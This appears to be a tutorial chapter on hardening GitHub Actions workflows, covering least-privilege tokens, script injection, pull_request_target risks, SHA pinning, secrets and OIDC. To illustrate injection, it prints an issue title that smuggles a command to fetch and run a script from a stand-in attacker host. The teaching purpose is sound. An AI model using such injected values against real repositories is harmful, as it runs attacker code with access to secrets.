# Security Hardening

A workflow is **code that runs with access to your repository, your secrets, and often your production systems**. Securing GitHub Actions means limiting what that code can do, controlling what code is allowed to run, and keeping untrusted input away from it.

```
Who can trigger it?  →  What code runs?  →  What can that code reach?
   (events, forks)      (actions, scripts)    (token, secrets, cloud)
```

Every section below shrinks one of those three things.

## The threat model in one picture

| Threat | Example | Main defense |
|--------|---------|--------------|
| **Script injection** | A PR title that becomes shell code | Pass untrusted data through `env:` |
| **Malicious or compromised action** | A third-party action's tag is moved to evil code | Pin to a full commit SHA, review code |
| **Untrusted code with secrets** | `pull_request_target` runs a fork's code with secrets | Never execute PR code with privileged triggers |
| **Over-privileged token** | A compromised step can push to `main` | `permissions: contents: read` |
| **Leaked long-lived credentials** | A cloud key in secrets is exfiltrated | OIDC with short-lived credentials |
| **Poisoned cache or artifact** | Untrusted run writes a cache that a release run trusts | Separate trust levels, treat artifacts as input |
| **Compromised self-hosted runner** | PR code persists on your machine | Ephemeral runners, never on public repos |

## 1. Least-privilege permissions

```yaml
permissions:
  contents: read          # workflow-wide default

jobs:
  release:
    permissions:
      contents: write     # only where required
```

- Put a `permissions:` block in **every** workflow
- Set the repository default to read-only: **Settings → Actions → General → Workflow permissions**
- Grant write scopes per job, never `write-all`

Details and recipes are in chapter 11.

## 2. Script injection

Expressions inside `${{ }}` are replaced with their text **before the shell runs**, so attacker-controlled text becomes code.

### The vulnerable pattern

```yaml
- name: Greet
  run: echo "Issue title is ${{ github.event.issue.title }}"
```

An issue titled:

```
"; curl https://evil.example/x.sh | sh; echo "
```

turns the command into:

```bash
echo "Issue title is "; curl https://evil.example/x.sh | sh; echo ""
```

The attacker's code now runs on your runner, with whatever secrets and token that step can see.

### The fix: use an environment variable

```yaml
- name: Greet
  run: echo "Issue title is $TITLE"
  env:
    TITLE: ${{ github.event.issue.title }}
```

Now the shell reads the value **as data** at run time. It is never parsed as part of the script.

### Context values you must treat as untrusted

| Source | Examples |
|--------|----------|
| Issues and PRs | `github.event.issue.title`, `.body`, `github.event.pull_request.title`, `.body` |
| Branch names | `github.head_ref`, `github.event.pull_request.head.ref` |
| Commits | `github.event.head_commit.message`, `.author.email`, `.author.name`, `commits.*.message` |
| Comments and reviews | `github.event.comment.body`, `github.event.review.body` |
| Labels and other free-text fields | `github.event.pull_request.head.repo.default_branch` and similar |
| Workflow inputs | `inputs.*` and `github.event.inputs.*` when triggered by less-trusted users |
| Step and job outputs derived from any of the above | `steps.*.outputs.*` |

When in doubt, treat a value as untrusted.

### Other injection routes

| Route | Defense |
|-------|---------|
| Writing untrusted text to `$GITHUB_ENV` or `$GITHUB_OUTPUT` | Validate it first; reject newlines and unexpected characters |
| `actions/github-script` with `${{ }}` inside `script:` | Read from `context.payload...` in JavaScript instead |
| Branch names with shell metacharacters | Quote everything: `"$BRANCH"` |
| Filenames from a PR | Never pass them to `eval` or an unquoted command |

```yaml
# Safer github-script: read the value in JS, do not interpolate into the script
- uses: actions/github-script@v7
  with:
    script: |
      const title = context.payload.pull_request.title;
      core.info(`Title: ${title}`);
```

## 3. Dangerous triggers: `pull_request_target` and `workflow_run`

| Event | Runs workflow from | Has secrets and write token? |
|-------|-------------------|------------------------------|
| `pull_request` | The PR's merge commit | **No** for forks, read-only token |
| `pull_request_target` | The **base** branch | **Yes** |
| `workflow_run` | The default branch | **Yes** |

The classic mistake ("pwn request"):

```yaml
on: pull_request_target
jobs:
  test:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # ✗ untrusted code
      - run: npm ci && npm test                            # ✗ runs it with secrets
```

A fork's `package.json` scripts can now steal your secrets.

### Safe patterns

| Pattern | How |
|---------|-----|
| Use `pull_request` for anything that builds or runs PR code | No secrets, no write access |
| Keep `pull_request_target` for **metadata only** (labeling, commenting) | Never check out or run the PR's code |
| Split into two workflows | An unprivileged `pull_request` workflow builds and uploads an artifact; a privileged `workflow_run` workflow reads that artifact **as data** and posts results |
| Require approval for first-time contributors | **Settings → Actions → General → Fork pull request workflows** |

## 4. Third-party actions

Every action you use runs inside your job. Treat each as a dependency with access to your secrets.

### Pin to a commit SHA

```yaml
- uses: some-org/some-action@<full-40-character-sha>   # v2.3.1
```

| Ref | Risk |
|-----|------|
| `@main`, `@master` | Changes whenever the maintainer pushes |
| `@v2` | Maintainer (or an attacker with their account) can move the tag |
| `@<full SHA>` | **Immutable**; cannot be altered |

Use the **full 40-character** SHA, not a short one. Keep it fresh with Dependabot (chapter 05).

### Review before trusting

| Check | Why |
|-------|-----|
| Source is readable and small | Easier to audit |
| Verified creator, active maintenance | Fewer abandoned or hijacked projects |
| Does it need your secrets? Which ones? | Pass only what it requires |
| What does it download at runtime? | Hidden fetches of unpinned code |
| Does a pinned fork under your organization make sense? | Freezes behavior |

### Restrict what may run

**Organization or repository Settings → Actions → General → Actions permissions:**

| Option | Effect |
|--------|--------|
| Allow only actions from your organization and GitHub | Strict |
| Allow selected actions and reusable workflows | Allow-list with patterns |
| Require actions to be pinned to a full-length commit SHA | Enforces SHA pinning |

## 5. Handling secrets

| Practice | Detail |
|----------|--------|
| Give secrets to the **step** that needs them | Not workflow-wide `env` |
| Use **environment** secrets for production | Behind approvals and branch rules |
| Never print secrets or derived values | Masking is not guaranteed for transformed values |
| One secret per value | Avoid JSON blobs |
| Rotate regularly and after any suspicion | Limits the window |
| Do not pass secrets to untrusted workflows | Fork PRs are denied by default; keep it that way |
| Enable **secret scanning and push protection** | Catches keys before they land in history |
| Prefer short-lived credentials over stored ones | See OIDC below |

Details in chapter 07.

## 6. OIDC: cloud access without stored secrets

**OpenID Connect (OIDC)** lets a workflow prove its identity to a cloud provider and receive a **short-lived** credential, so no long-lived key lives in GitHub at all.

```
job requests token ─► GitHub issues signed JWT (repo, ref, environment...)
         │
         ▼
   cloud provider verifies signature and trust rules
         │
         ▼
   returns temporary credentials (minutes)
```

### Workflow side (AWS example)

```yaml
permissions:
  id-token: write          # required to request the OIDC token
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/github-deploy
          aws-region: eu-west-1
      - run: aws sts get-caller-identity
```

### Cloud side: the trust policy (AWS)

```json
{
  "Effect": "Allow",
  "Principal": { "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com" },
  "Action": "sts:AssumeRoleWithWebIdentity",
  "Condition": {
    "StringEquals": {
      "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
      "token.actions.githubusercontent.com:sub": "repo:my-org/my-repo:environment:production"
    }
  }
}
```

The `sub` (subject) condition is the security boundary: it restricts which repository, branch, tag, or environment may assume the role. **Never leave it open** to every repository.

### Typical `sub` values

| Pattern | Meaning |
|---------|---------|
| `repo:ORG/REPO:ref:refs/heads/main` | Runs on the `main` branch |
| `repo:ORG/REPO:environment:production` | Jobs using the `production` environment |
| `repo:ORG/REPO:pull_request` | Pull request runs |
| `repo:ORG/REPO:ref:refs/tags/v*` | Tag runs (use the provider's wildcard syntax) |

### Other providers

| Provider | Action | Key inputs |
|----------|--------|-----------|
| Azure | `azure/login` | `client-id`, `tenant-id`, `subscription-id` (federated credential) |
| Google Cloud | `google-github-actions/auth` | `workload_identity_provider`, `service_account` |
| HashiCorp Vault, others | Provider-specific | JWT auth with the same claims |

Always check the provider's current documentation for exact setup steps.

## 7. Runners

| Rule | Why |
|------|-----|
| Prefer GitHub-hosted runners | Fresh, isolated VM per job |
| Never attach self-hosted runners to public repositories | Anyone can run code through a pull request |
| Use ephemeral self-hosted runners | A job cannot leave anything for the next one |
| Isolate runners from sensitive networks and credentials | Limits lateral movement |
| Use runner groups to limit which repositories can use them | Smaller blast radius |

## 8. Protect the workflow files themselves

| Control | Setting |
|---------|---------|
| **CODEOWNERS** for `.github/workflows/` | Require review from the platform or security team |
| Branch protection or rulesets on `main` | Require PR review before changes land |
| Restrict who can create or edit workflows | Fewer people with write access |
| Require approval to run workflows from outside collaborators | **Settings → Actions → General** |
| Limit repository admin rights | Admins can change settings and secrets |

```
# .github/CODEOWNERS
/.github/workflows/  @my-org/platform-security
```

## 9. Caches, artifacts, and checkouts

| Risk | Defense |
|------|---------|
| Cache poisoning by an untrusted workflow | Do not share caches between untrusted PR runs and release builds; never restore caches in privileged workflows from untrusted branches |
| Artifact from an untrusted run | Treat it as input: validate it, never execute it in a privileged context |
| Credentials left in `.git/config` | `actions/checkout` with `persist-credentials: false` when later steps run untrusted code |
| Secrets uploaded in artifacts | Exclude `.env`, keys, and config; artifacts are readable by anyone with repository read access |

## 10. Detect problems early

| Tool | What it does |
|------|--------------|
| **actionlint** | Lints workflows for syntax and common expression mistakes |
| **zizmor** | Static analysis for Actions security issues such as injection and excessive permissions |
| **CodeQL for GitHub Actions** | Code scanning that includes workflow files |
| **OpenSSF Scorecard** | Scores repository security practices, including pinning and permissions |
| **StepSecurity Harden-Runner** or similar | Monitors network egress from runners |
| **Dependabot** (`github-actions` ecosystem) | Keeps pinned actions current |
| **Secret scanning and push protection** | Blocks leaked credentials |
| **Audit log** | Reviews who changed workflows, secrets, and settings (organization plans) |

Run the linters in CI itself:

```yaml
- uses: actions/checkout@v4
- name: Lint workflows
  run: |
    bash <(curl -s https://raw.githubusercontent.com/rhysd/actionlint/main/scripts/download-actionlint.bash)
    ./actionlint
```

For production use, download a pinned release and verify its checksum rather than piping a script from a moving branch.

## 11. Attestations and supply chain

| Practice | Value |
|----------|-------|
| **Build provenance attestations** (`actions/attest-build-provenance`) | Anyone can verify an artifact came from your workflow |
| SBOM generation | A list of what is inside the release |
| Signed images and releases | Consumers verify authenticity |
| Lockfiles and `npm ci` | Reproducible dependency trees |
| Dependency review on PRs | Flags new vulnerable or suspicious packages |

## A hardened baseline workflow

```yaml
name: CI

on:
  pull_request:
  push:
    branches: [main]

permissions:
  contents: read                                   # least privilege

concurrency:
  group: ci-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 15                            # bounded runtime
    steps:
      - uses: actions/checkout@<full-sha>          # v4.x.y, pinned
        with:
          persist-credentials: false               # do not leave the token behind
      - uses: actions/setup-node@<full-sha>        # v4.x.y, pinned
        with:
          node-version: 20
          cache: npm
      - run: npm ci
      - run: npm test
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}   # untrusted data via env only
```

## If you suspect a compromise

1. **Disable** the workflow or cancel running jobs
2. **Rotate** every secret the workflow could access, plus any cloud credentials
3. **Review** recent runs, workflow-file changes, and the audit log
4. **Check** for unexpected pushes, releases, packages, and deploy keys
5. **Remove** the offending action or change, pin to a known good SHA, and re-enable
6. **Revoke** OIDC trust and tokens where applicable, then add controls (CODEOWNERS, SHA-pinning policy)

## Security checklist

- [ ] `permissions:` set in every workflow, default repository token read-only
- [ ] No untrusted `${{ }}` inside `run:` or `github-script` code
- [ ] Third-party actions pinned to full SHAs, with Dependabot enabled
- [ ] No privileged trigger executes PR code
- [ ] Production secrets live in environments with approvals and branch rules
- [ ] Cloud access uses OIDC with a narrow `sub` condition
- [ ] No self-hosted runners on public repositories
- [ ] Workflow files covered by CODEOWNERS and branch protection
- [ ] `timeout-minutes` set on all jobs
- [ ] Secret scanning and push protection on
- [ ] actionlint or zizmor running in CI

## Mental model checklist

- **Triggers** decide who can start code, **actions and scripts** decide what runs, **permissions and secrets** decide what it can touch
- Untrusted text never enters a script through `${{ }}`
- Privileged events never run untrusted code
- Immutable references (SHAs) beat mutable ones (tags, branches)
- Short-lived credentials beat long-lived ones

## Common questions

| Question | Answer |
|----------|--------|
| Is `actions/checkout@v4` safe to leave unpinned? | GitHub-owned actions carry lower risk, but SHA pinning is still the strongest guarantee; many organizations pin everything |
| Does masking stop a leak? | It hides exact matches in logs only; transformed or split values may still print |
| Can a pull request change the workflow that runs on it? | For `pull_request`, yes (it uses the PR's version), but with no secrets and a read-only token for forks |
| What is the difference between `GITHUB_TOKEN` and OIDC tokens? | `GITHUB_TOKEN` accesses GitHub; the OIDC token proves identity to external clouds |
| Do I need OIDC for GitHub Pages? | Pages deployment uses `id-token: write` for its own purposes |
| How do I stop accidental secret exposure in forks? | Keep fork workflows on `pull_request` and require approval for outside contributors |
| Is a private repository automatically safe? | Safer from outsiders, but insiders, compromised accounts, and third-party actions are still risks |
| Should I allow all actions org-wide? | Prefer an allow-list and a SHA-pinning policy |

## Pitfalls

| Pitfall | Why it hurts | Better |
|---------|--------------|--------|
| `${{ github.event.*.title }}` inside `run:` | Command injection | Pass through `env:` |
| `pull_request_target` plus checking out the PR head | Fork code runs with secrets | Use `pull_request`, or never execute PR code |
| Pinning to tags only | Tags can be moved | Full SHA with a version comment |
| `permissions: write-all` | Maximum damage if compromised | Minimum scopes per job |
| Cloud keys stored as secrets | Long-lived, easy to exfiltrate | OIDC with a narrow `sub` |
| OIDC trust policy that accepts any repository | Anyone's workflow can assume the role | Restrict `sub` to repo and environment |
| Self-hosted runner on a public repo | Remote code execution through PRs | Hosted runners, or restrict who can trigger |
| Debugging with `env` or `printenv` | Prints secrets into logs | Print only specific, non-secret variables |
| Never reviewing workflow changes | Attackers modify workflows quietly | CODEOWNERS and required reviews |

## Try it

1. Create a test repository with a workflow that echoes `${{ github.event.issue.title }}` unsafely, open an issue with a title containing `"; echo INJECTED; echo "`, and observe it; then fix it with `env:`
2. Run `actionlint` (and `zizmor` if you can) against your workflows and fix the findings
3. Pin every third-party action to a full SHA and add the Dependabot `github-actions` config

## Key takeaways

- Treat workflows as privileged code: limit triggers, code, and permissions
- Never place untrusted context values directly in scripts; use `env:`
- Do not run untrusted PR code under `pull_request_target` or `workflow_run`
- Pin third-party actions to full SHAs and restrict which actions may run
- Use OIDC for cloud access, environment secrets for approvals, and CODEOWNERS for the workflow files

**Next:** [Debugging and Workflow Commands](./18_debugging-and-workflow-commands.md)
